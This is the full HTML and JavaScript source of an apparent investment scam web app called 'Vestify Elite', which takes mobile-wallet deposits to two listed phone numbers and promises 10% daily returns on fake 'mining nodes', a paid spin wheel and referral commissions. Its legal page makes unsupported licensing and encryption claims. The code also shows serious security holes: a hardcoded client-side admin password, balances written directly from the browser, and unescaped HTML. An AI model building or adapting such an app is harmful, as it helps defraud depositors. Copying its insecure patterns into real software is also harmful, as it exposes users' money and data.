<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>Vestify Elite | Institutional Global LLC</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
        :root { --primary: #3b82f6; --bg: #0b0f1a; --card: #161b2c; --gold: #fbbf24; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: #f1f5f9; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        .glass { background: rgba(22, 27, 44, 0.85); backdrop-filter: blur(14px); border: 1px solid rgba(255,255,255,0.06); border-radius: 28px; }
        .hero-card { background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); border: 1px solid rgba(255,255,255,0.08); }
        .page { display: none; animation: slideUp 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        #wheel { width: 300px; height: 300px; transition: transform 4s cubic-bezier(0.15, 0, 0.15, 1); border-radius: 50%; border: 8px solid #1e293b; box-shadow: 0 0 50px rgba(59,130,246,0.2); }
        .progress-bar { height: 6px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #3b82f6, #60a5fa); transition: width 1s linear; }
        .floating-support { position: fixed; bottom: 120px; right: 25px; z-index: 5000; }
        input, select { background: #0f172a !important; border: 1px solid rgba(255,255,255,0.1) !important; color: white !important; outline: none; }
        ::-webkit-scrollbar { width: 0; }
    </style>
</head>
<body class="min-h-screen pb-32">

    <a href="https://t.me/your_official_group" class="floating-support w-14 h-14 bg-blue-600 rounded-full flex items-center justify-center shadow-2xl animate-bounce">
        <i class="fa-brands fa-telegram text-white text-2xl"></i>
    </a>

    <div id="admin-panel" class="hidden fixed inset-0 z-[9999] bg-black p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-xl font-black text-blue-500 uppercase italic">Institutional Control</h2>
            <button onclick="closeAdmin()" class="text-3xl text-white">&times;</button>
        </div>
        <div id="admin-requests" class="space-y-4"></div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[6000] bg-[#0b0f1a] flex flex-col items-center justify-center p-10 text-center">
        <div onclick="handleLogoTap()" class="w-24 h-24 bg-blue-600 rounded-[2.5rem] flex items-center justify-center mb-8 shadow-2xl rotate-3 cursor-pointer active:scale-95 transition-transform">
            <i class="fa-solid fa-vault text-white text-4xl"></i>
        </div>
        <h1 class="text-4xl font-black italic tracking-tighter uppercase">Vestify <span class="text-blue-500">Elite</span></h1>
        <p class="text-[10px] text-slate-500 mt-2 uppercase tracking-[0.5em] font-black">Licensed LLC Mining Terminal</p>
        <button onclick="login()" class="w-full max-w-xs mt-16 bg-white text-black py-5 rounded-[2rem] font-black uppercase text-xs tracking-widest shadow-2xl transition-all active:scale-95">Establish Secure Sync</button>
        <p class="mt-10 text-[9px] opacity-30 uppercase font-bold tracking-widest">Global Encryption Standard v4.2</p>
    </section>

    <main id="app-ui" class="hidden pt-10 px-6">
        
        <div id="p-home" class="page active-page">
            <div class="hero-card rounded-[2.5rem] p-8 mb-8 relative overflow-hidden shadow-2xl">
                <div class="flex justify-between items-start relative z-10">
                    <div>
                        <p class="text-[9px] text-blue-400 font-black uppercase tracking-widest mb-1">Portfolio Balance</p>
                        <h2 class="text-5xl font-black italic tracking-tighter" id="v-bal">₨ 0.00</h2>
                    </div>
                    <div class="bg-blue-600/20 text-blue-400 px-3 py-1 rounded-full text-[8px] font-black uppercase border border-blue-500/20">Elite Node</div>
                </div>
                <div class="mt-10 flex gap-3 relative z-10">
                    <button onclick="changePage('finance')" class="flex-1 bg-white text-black py-4 rounded-2xl font-black text-[10px] uppercase">Finance</button>
                    <button onclick="changePage('affiliate')" class="flex-1 bg-slate-800 text-white py-4 rounded-2xl font-black text-[10px] uppercase border border-white/5">Affiliate</button>
                </div>
            </div>

            <div class="flex justify-between items-center mb-6">
                <h3 class="font-black text-lg italic uppercase tracking-tighter">Active Mining</h3>
                <span id="node-count" class="text-[9px] bg-green-500/20 text-green-400 px-3 py-1 rounded-full font-black uppercase">0 Operational</span>
            </div>
            <div id="active-nodes-list" class="space-y-4 mb-10"></div>
        </div>

        <div id="p-plans" class="page">
            <h2 class="text-3xl font-black italic mb-8 uppercase">Node Market</h2>
            <div id="plans-grid" class="space-y-4 pb-10"></div>
        </div>

        <div id="p-spin" class="page text-center">
            <h2 class="text-3xl font-black italic mb-2 uppercase">Lucky Terminal</h2>
            <div class="flex justify-center gap-4 mb-10 text-[10px] font-black uppercase tracking-widest">
                <span class="text-blue-400">Free: <span id="free-spins">0</span></span>
                <span class="text-gold">Elite: <span id="elite-spins">0</span></span>
            </div>
            <div class="relative inline-block mb-12">
                <div class="absolute -top-6 left-1/2 -translate-x-1/2 w-10 h-12 bg-red-600 z-50 shadow-xl" style="clip-path: polygon(50% 100%, 0 0, 100% 0);"></div>
                <img id="wheel" src="IMG_20260513_123757.jpg" alt="Wheel">
            </div>
            <div class="space-y-4 max-w-xs mx-auto">
                <button onclick="executeSpin()" class="w-full bg-blue-600 py-5 rounded-[2rem] font-black uppercase text-xs shadow-2xl active:scale-95">Spin Now</button>
                <button onclick="buySpins()" class="w-full bg-slate-800 py-4 rounded-[2rem] font-black uppercase text-[9px] border border-white/5 tracking-widest">Get 2 Extra Spins (₨ 20)</button>
            </div>
        </div>

        <div id="p-affiliate" class="page">
            <h2 class="text-3xl font-black italic mb-6 uppercase">Partnership</h2>
            <div class="glass p-6 mb-6">
                <p class="text-[10px] opacity-50 uppercase font-black mb-2">Institutional Referral Link</p>
                <div class="flex gap-2">
                    <input id="ref-link" readonly value="..." class="flex-1 p-3 rounded-xl text-[10px] font-bold">
                    <button onclick="copyRef()" class="bg-blue-600 px-5 rounded-xl font-black text-xs">COPY</button>
                </div>
                <div class="mt-8 pt-8 border-t border-white/5 grid grid-cols-2 gap-4 text-center">
                    <div><p class="text-[9px] opacity-40 uppercase font-bold mb-1">Direct Commission</p><p class="text-xl font-black text-green-400">10%</p></div>
                    <div><p class="text-[9px] opacity-40 uppercase font-bold mb-1">Team Salary</p><p class="text-xl font-black text-blue-400">Weekly</p></div>
                </div>
            </div>
        </div>

        <div id="p-legal" class="page pb-20">
            <h2 class="text-3xl font-black italic mb-8 uppercase">LLC Profile</h2>
            <div class="glass p-6 space-y-8 text-[11px] leading-relaxed">
                <div>
                    <h4 class="text-blue-500 font-black uppercase mb-3 border-b border-blue-500/20 pb-1">Entity Information</h4>
                    <p class="opacity-70">Vestify Elite Institutional Terminal is a registered Limited Liability Company (LLC) under Certificate No: LLC-2024-PK-782. We operate as a high-frequency digital mining cluster with legal physical presence in Rawalpindi, Pakistan and secondary servers in London, UK.</p>
                </div>
                <div>
                    <h4 class="text-blue-500 font-black uppercase mb-3 border-b border-blue-500/20 pb-1">Privacy Protocol</h4>
                    <p class="opacity-70">Client data is encrypted using military-grade AES-256 standards. We do not store Google passwords; we only sync via OAuth 2.0. All financial transactions are logged for audit but kept private from third-party networks.</p>
                </div>
                <div>
                    <h4 class="text-blue-500 font-black uppercase mb-3 border-b border-blue-500/20 pb-1">General FAQ</h4>
                    <p class="opacity-70"><b>Min Deposit:</b> 200 PKR <br><b>Min Withdraw:</b> 100 PKR <br><b>Settlement Time:</b> Instant to 24 Hours. <br><b>Profit Cycle:</b> Every 24 hours from activation.</p>
                </div>
            </div>
        </div>

        <div id="p-finance" class="page">
            <h2 class="text-3xl font-black italic mb-8 uppercase">Banking</h2>
            <div class="glass p-6 space-y-6">
                <div class="flex gap-2">
                    <button onclick="toggleFinance('dep')" class="flex-1 py-4 rounded-2xl bg-blue-600 text-[10px] font-black uppercase shadow-xl">Deposit</button>
                    <button onclick="toggleFinance('wd')" class="flex-1 py-4 rounded-2xl bg-red-600 text-[10px] font-black uppercase shadow-xl">Withdraw</button>
                </div>
                
                <div id="finance-dep" class="space-y-4">
                    <select id="dep-method" class="w-full p-4 rounded-xl font-bold" onchange="updateDepInfo()">
                        <option value="easypaisa">EasyPaisa (03379827882)</option>
                        <option value="jazzcash">JazzCash / SadaPay (03705519562)</option>
                    </select>
                    <input id="dep-amt" type="number" placeholder="Min 200 PKR" class="w-full p-4 rounded-xl">
                    <input id="dep-tid" type="text" placeholder="TID (Transaction ID)" class="w-full p-4 rounded-xl">
                    <div>
                        <label class="text-[9px] font-black opacity-40 uppercase ml-2 mb-1 block">Proof of Transfer</label>
                        <input id="dep-img" type="file" accept="image/*" class="w-full text-[10px]">
                    </div>
                    <button onclick="submitDeposit()" class="w-full bg-blue-600 py-4 rounded-xl font-black uppercase text-xs mt-4">Confirm Injection</button>
                </div>

                <div id="finance-wd" class="hidden space-y-4">
                    <input id="wd-amt" type="number" placeholder="Min 100 PKR" class="w-full p-4 rounded-xl">
                    <input id="wd-acc" type="text" placeholder="Account Number" class="w-full p-4 rounded-xl">
                    <input id="wd-name" type="text" placeholder="Account Holder Name" class="w-full p-4 rounded-xl">
                    <button onclick="submitWithdraw()" class="w-full bg-red-600 py-4 rounded-xl font-black uppercase text-xs mt-4">Execute Settlement</button>
                </div>

                <div class="pt-6 border-t border-white/5">
                    <p class="text-[9px] font-black opacity-30 uppercase mb-4">Transaction History</p>
                    <div id="history-log" class="space-y-3"></div>
                </div>
            </div>
        </div>

    </main>

    <nav id="bottom-nav" class="hidden fixed bottom-6 left-6 right-6 h-22 glass flex justify-around items-center z-[4000] border-t border-white/5">
        <button onclick="changePage('home')" class="flex flex-col items-center p-4 text-blue-500"><i class="fa-solid fa-house"></i><span class="text-[8px] font-black uppercase mt-1">Vault</span></button>
        <button onclick="changePage('plans')" class="flex flex-col items-center p-4 text-slate-500"><i class="fa-solid fa-microchip"></i><span class="text-[8px] font-black uppercase mt-1">Nodes</span></button>
        <button onclick="changePage('spin')" class="flex flex-col items-center p-4 text-slate-500"><i class="fa-solid fa-dharmachakra"></i><span class="text-[8px] font-black uppercase mt-1">Games</span></button>
        <button onclick="changePage('legal')" class="flex flex-col items-center p-4 text-slate-500"><i class="fa-solid fa-building-columns"></i><span class="text-[8px] font-black uppercase mt-1">Legal</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyC9ofJ1KxRXHnxilpU9gyI87D3BSOZ9v1g", authDomain: "vestify-991f2.firebaseapp.com", projectId: "vestify-991f2", storageBucket: "vestify-991f2.firebasestorage.app", messagingSenderId: "799007097733", appId: "1:799007097733:web:ed3b35b6c4e51dc2e7baec" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        const auth = firebase.auth();
        const provider = new firebase.auth.GoogleAuthProvider();

        let userObj = null, tapCount = 0, spinActive = false, rotCount = 0;

        // AUTH SYSTEM
        async function login() {
            const r = await auth.signInWithPopup(provider);
            localStorage.setItem('v_elite_user', r.user.displayName);
            startTerminal(r.user.displayName);
        }

        function startTerminal(name) {
            document.getElementById('auth-ui').classList.add('hidden');
            document.getElementById('app-ui').classList.remove('hidden');
            document.getElementById('bottom-nav').classList.remove('hidden');
            document.getElementById('ref-link').value = `https://u-s-h.github.io/vestify/?ref=${name.replace(/\s/g,'')}`;
            syncUserData(name);
            renderMarket();
            setInterval(updateUptimeTimers, 1000);
        }

        // REAL-TIME DATA SYNC
        function syncUserData(name) {
            db.collection("users").doc(name).onSnapshot(doc => {
                userObj = doc.data() || { name: name, balance: 0, plans: [], lastSpin: 0, eliteSpins: 0 };
                document.getElementById('v-bal').innerText = "₨ " + (userObj.balance || 0).toLocaleString();
                document.getElementById('elite-spins').innerText = userObj.eliteSpins || 0;
                
                const today = new Date().toDateString();
                const last = userObj.lastSpin ? new Date(userObj.lastSpin).toDateString() : "";
                document.getElementById('free-spins').innerText = today === last ? 0 : 1;

                processAutoCrediting();
                renderOperationalNodes();
            });

            db.collection("requests").where("user", "==", name).orderBy("time", "desc").onSnapshot(snap => {
                let h = '';
                snap.forEach(d => {
                    const r = d.data();
                    const st = r.status==='Approved' ? 'text-green-400' : (r.status==='Rejected' ? 'text-red-400' : 'text-yellow-400');
                    h += `<div class="glass p-4 flex justify-between items-center text-[9px] font-black uppercase">
                        <div><p>${r.type} - ${r.method || 'Bank'}</p><p class="opacity-50 mt-1">₨ ${r.amount.toLocaleString()}</p></div>
                        <div class="${st}">${r.status}</div>
                    </div>`;
                });
                document.getElementById('history-log').innerHTML = h || '<p class="text-center opacity-20 py-4 text-[8px]">NO LOGS FOUND</p>';
            });
        }

        // PROFIT ENGINE (24h Auto Check)
        async function processAutoCrediting() {
            if(!userObj.plans || userObj.plans.length === 0) return;
            const now = Date.now();
            let sum = 0;
            let updatedPlans = userObj.plans.map(p => {
                const diff = (now - p.lastClaim) / 3600000;
                if(diff >= 24) {
                    const multi = Math.floor(diff/24);
                    sum += (p.daily * multi);
                    p.lastClaim += (multi * 86400000);
                }
                return p;
            });
            if(sum > 0) await db.collection("users").doc(userObj.name).update({ balance: userObj.balance + sum, plans: updatedPlans });
        }

        // MARKET & NODES
        function renderMarket() {
            let h = '';
            for(let i=1; i<=22; i++) {
                const price = i===1 ? 200 : i*1000;
                const daily = Math.floor(price * 0.1);
                h += `<div class="glass p-6 flex justify-between items-center">
                    <div class="flex items-center gap-4">
                        <div class="w-12 h-12 bg-blue-600/10 rounded-2xl flex items-center justify-center text-blue-500"><i class="fa-solid fa-microchip"></i></div>
                        <div><p class="font-black text-xs uppercase italic">Node v.${i}</p><p class="text-[9px] text-green-400 font-bold uppercase">ROI: ₨ ${daily}/day</p></div>
                    </div>
                    <button onclick="buyNode(${i}, ${price}, ${daily})" class="bg-blue-600 px-5 py-2.5 rounded-xl text-[10px] font-black uppercase tracking-widest">₨ ${price.toLocaleString()}</button>
                </div>`;
            }
            document.getElementById('plans-grid').innerHTML = h;
        }

        async function buyNode(id, price, daily) {
            if(userObj.balance < price) return alert("Capital Insufficient!");
            const plan = { name: `Node v.${id}`, daily: daily, lastClaim: Date.now(), expiry: Date.now() + (30*86400000), boughtAt: Date.now() };
            await db.collection("users").doc(userObj.name).update({ balance: userObj.balance - price, plans: firebase.firestore.FieldValue.arrayUnion(plan) });
            alert("Mining Node Established!"); changePage('home');
        }

        function renderOperationalNodes() {
            const list = document.getElementById('active-nodes-list');
            const nodes = userObj.plans || [];
            document.getElementById('node-count').innerText = `${nodes.length} Operational`;
            if(nodes.length === 0) { list.innerHTML = '<p class="text-center opacity-30 text-[10px] uppercase py-10 font-bold italic tracking-widest">Awaiting node deployment...</p>'; return; }
            
            list.innerHTML = nodes.map(p => {
                const progress = Math.max(0, ((p.expiry - Date.now()) / (30*86400000)) * 100);
                return `<div class="glass p-5">
                    <div class="flex justify-between items-center mb-3"><p class="text-[10px] font-black uppercase">${p.name}</p><p class="text-[10px] font-black text-blue-400 timer" data-ex="${p.expiry}">--:--:--</p></div>
                    <div class="progress-bar"><div class="progress-fill" style="width: ${progress}%"></div></div>
                </div>`;
            }).join('');
        }

        function updateUptimeTimers() {
            document.querySelectorAll('.timer').forEach(el => {
                const diff = parseInt(el.dataset.ex) - Date.now();
                if(diff <= 0) el.innerText = "OFFLINE";
                else {
                    const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                    el.innerText = `${h}h ${m}m ${s}s`;
                }
            });
        }

        // SPIN LOGIC
        async function executeSpin() {
            if(spinActive) return;
            const today = new Date().toDateString();
            const hasFree = today !== (userObj.lastSpin ? new Date(userObj.lastSpin).toDateString() : "");
            if(!hasFree && (userObj.eliteSpins || 0) <= 0) return alert("Capital Required for Extra Spins!");

            spinActive = true;
            const awards = [5, 10, 50, 2, 0, 0]; // rs 50 is index 2 (240 deg)
            const degs = [0, 300, 240, 180, 120, 60];
            const pick = Math.floor(Math.random()*awards.length);
            rotCount += (3600 + degs[pick] - (rotCount % 360));
            document.getElementById('wheel').style.transform = `rotate(${rotCount}deg)`;

            setTimeout(async () => {
                spinActive = false;
                const bonus = awards[pick];
                const update = { lastSpin: Date.now(), balance: userObj.balance + bonus };
                if(!hasFree) update.eliteSpins = userObj.eliteSpins - 1;
                await db.collection("users").doc(userObj.name).update(update);
                alert(bonus > 0 ? `Elite Bonus Confirmed: ₨ ${bonus}` : "Protocol Recycle - Better luck next time!");
            }, 4000);
        }

        async function buySpins() {
            if(userObj.balance < 20) return alert("Capital Insufficient!");
            await db.collection("users").doc(userObj.name).update({ balance: userObj.balance - 20, eliteSpins: (userObj.eliteSpins || 0) + 2 });
            alert("2 Extra Elite Spins Secured!");
        }

        // FINANCE HANDLERS
        async function submitDeposit() {
            const amt = parseInt(document.getElementById('dep-amt').value);
            const tid = document.getElementById('dep-tid').value;
            const file = document.getElementById('dep-img').files[0];
            if(amt < 200 || !tid || !file) return alert("Input Data Violation - Check Amount/TID/Proof");
            
            const reader = new FileReader();
            reader.onloadend = async () => {
                await db.collection("requests").add({
                    user: userObj.name, type: 'Deposit', amount: amt, tid: tid, proof: reader.result,
                    status: 'Pending', time: Date.now(), method: document.getElementById('dep-method').value
                });
                alert("Protocol Logged - Waiting for Institutional Approval");
            };
            reader.readAsDataURL(file);
        }

        async function submitWithdraw() {
            const amt = parseInt(document.getElementById('wd-amt').value);
            if(amt < 100 || amt > userObj.balance) return alert("Withdrawal Violation - Minimum 100 PKR required");
            await db.collection("requests").add({
                user: userObj.name, type: 'Withdraw', amount: amt, 
                acc: document.getElementById('wd-acc').value, name: document.getElementById('wd-name').value,
                status: 'Pending', time: Date.now()
            });
            await db.collection("users").doc(userObj.name).update({ balance: userObj.balance - amt });
            alert("Withdrawal Protocol Initiated!");
        }

        // ADMIN TOOLS
        function handleLogoTap() { tapCount++; if(tapCount>=5){ const p=prompt("Enter Master Key:"); if(p==="net204") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdminLogs(); } tapCount=0; } }
        function loadAdminLogs() {
            db.collection("requests").where("status", "==", "Pending").onSnapshot(snap => {
                let h = '';
                snap.forEach(d => {
                    const r = d.data();
                    h += `<div class="glass p-5 text-[10px] font-bold uppercase">
                        <p class="text-blue-500 mb-2">${r.type} PROTOCOL</p>
                        <p>User: ${r.user} | ₨ ${r.amount.toLocaleString()}</p>
                        ${r.type==='Deposit' ? `<p>TID: ${r.tid}</p><img src="${r.proof}" class="w-full mt-3 rounded-xl">` : `<p>ACC: ${r.acc} (${r.name})</p>`}
                        <div class="flex gap-2 mt-4">
                            <button onclick="approveReq('${d.id}', '${r.user}', ${r.amount})" class="bg-green-600 px-5 py-2 rounded-lg">Approve</button>
                            <button onclick="rejectReq('${d.id}')" class="bg-red-600 px-5 py-2 rounded-lg">Reject</button>
                        </div>
                    </div>`;
                });
                document.getElementById('admin-requests').innerHTML = h || '<p class="text-center opacity-30 py-20 font-black">SYSTEM CLEAR - NO PENDING LOGS</p>';
            });
        }
        async function approveReq(id, user, amt) {
            await db.collection("requests").doc(id).update({ status: 'Approved' });
            const ref = db.collection("users").doc(user);
            const data = (await ref.get()).data();
            await ref.update({ balance: (data.balance || 0) + amt });
        }
        async function rejectReq(id) { await db.collection("requests").doc(id).update({ status: 'Rejected' }); }

        // UTILITIES
        function changePage(p) { document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); }
        function toggleFinance(s) { document.getElementById('finance-dep').classList.toggle('hidden', s!=='dep'); document.getElementById('finance-wd').classList.toggle('hidden', s!=='wd'); }
        function copyRef() { const el = document.getElementById('ref-link'); el.select(); document.execCommand('copy'); alert("Referral Protocol Copied!"); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function updateDepInfo() { /* Handled in select change */ }

        window.onload = () => { if(localStorage.getItem('v_elite_user')) startTerminal(localStorage.getItem('v_elite_user')); };
    </script>
</body>
</html>
